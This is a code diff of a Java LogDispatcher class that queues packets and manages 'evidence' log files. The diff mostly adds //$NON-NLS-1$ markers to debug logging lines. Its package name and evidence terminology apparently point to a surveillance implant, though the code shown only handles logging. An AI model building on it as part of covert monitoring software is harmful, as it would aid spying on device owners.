@@ -27,7 +27,7 @@ import com.android.service.util.Check;
  * creation, write and close.
  */
 public class LogDispatcher extends Thread implements Runnable {
-	private static final String TAG = "LogDispatcher";
+	private static final String TAG = "LogDispatcher"; //$NON-NLS-1$
 
 	/** The singleton. */
 	private volatile static LogDispatcher singleton;
@@ -81,7 +81,7 @@ public class LogDispatcher extends Thread implements Runnable {
 	 */
 	private void processQueue() {
 		Packet p;
-		// if(AutoConfig.DEBUG) Check.log( TAG +
+		// if(AutoConfig.DEBUG) Check.log( TAG  ;//$NON-NLS-1$
 		// " processQueue() Packets in Queue: " + q.size());
 
 		if (queue.size() == 0) {
@@ -92,7 +92,7 @@ public class LogDispatcher extends Thread implements Runnable {
 			p = queue.take();
 		} catch (final InterruptedException e) {
 			if (Cfg.DEBUG) {
-				Check.log(e);
+				Check.log(e) ;//$NON-NLS-1$
 			}
 			return;
 		}
@@ -116,7 +116,7 @@ public class LogDispatcher extends Thread implements Runnable {
 
 		default:
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: " + "processQueue() got LOG_UNKNOWN");
+				Check.log(TAG + " Error: " + "processQueue() got LOG_UNKNOWN"); //$NON-NLS-1$ //$NON-NLS-2$
 			}
 			break;
 		}
@@ -149,7 +149,7 @@ public class LogDispatcher extends Thread implements Runnable {
 	@Override
 	public void run() {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " LogDispatcher started");
+			Check.log(TAG + " LogDispatcher started"); //$NON-NLS-1$
 		}
 
 		// Create log directory
@@ -172,7 +172,7 @@ public class LogDispatcher extends Thread implements Runnable {
 					queue.clear();
 					evidences.clear();
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " LogDispatcher closing");
+						Check.log(TAG + " LogDispatcher closing"); //$NON-NLS-1$
 					}
 					return;
 				}
@@ -180,7 +180,7 @@ public class LogDispatcher extends Thread implements Runnable {
 				processQueue();
 			} catch (final Exception e) {
 				if (Cfg.DEBUG) {
-					Check.log(e);
+					Check.log(e) ;//$NON-NLS-1$
 				}
 			} finally {
 				lock.unlock();
@@ -207,7 +207,7 @@ public class LogDispatcher extends Thread implements Runnable {
 			}
 		} catch (final Exception e) {
 			if (Cfg.DEBUG) {
-				Check.log(e);
+				Check.log(e) ;//$NON-NLS-1$
 			}
 		} finally {
 			lock.unlock();
@@ -239,7 +239,7 @@ public class LogDispatcher extends Thread implements Runnable {
 	 */
 	private boolean createLog(final Packet p) {
 		if (Cfg.DEBUG) {
-			Check.ensures(!evidences.containsKey(p.getId()), "evidence already mapped");
+			Check.ensures(!evidences.containsKey(p.getId()), "evidence already mapped"); //$NON-NLS-1$
 		}
 
 		final byte[] additional = p.getAdditional();
@@ -260,7 +260,7 @@ public class LogDispatcher extends Thread implements Runnable {
 	 */
 	private void atomicLog(final Packet p) {
 		if (Cfg.DEBUG) {
-			Check.ensures(!evidences.containsKey(p.getId()), "evidence already mapped");
+			Check.ensures(!evidences.containsKey(p.getId()), "evidence already mapped"); //$NON-NLS-1$
 		}
 
 		final byte[] additional = p.getAdditional();
@@ -282,7 +282,7 @@ public class LogDispatcher extends Thread implements Runnable {
 	private boolean writeLog(final Packet p) {
 		if (evidences.containsKey(p.getId()) == false) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Requested log not found");
+				Check.log(TAG + " Requested log not found"); //$NON-NLS-1$
 			}
 			return false;
 		}
@@ -303,7 +303,7 @@ public class LogDispatcher extends Thread implements Runnable {
 	private boolean closeLog(final Packet p) {
 		if (evidences.containsKey(p.getId()) == false) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Requested log not found");
+				Check.log(TAG + " Requested log not found"); //$NON-NLS-1$
 			}
 			return false;
 		}
